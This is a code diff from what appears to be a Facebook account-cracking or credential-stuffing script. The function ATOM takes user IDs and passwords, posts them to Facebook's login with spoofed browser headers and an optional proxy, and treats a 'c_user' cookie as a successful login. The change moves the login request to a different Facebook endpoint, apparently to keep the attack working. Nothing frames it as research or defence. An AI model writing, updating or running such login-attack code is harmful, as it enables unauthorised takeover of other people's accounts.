@@ -149,7 +149,7 @@ def ATOM(uid, pww, total_idz):
             "sec-ch-prefers-color-scheme":"dark",
             "Accept-Encoding":"gzip, deflate, br, zstd",
             "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
-            response = session.post('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQwMjMyNDM2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
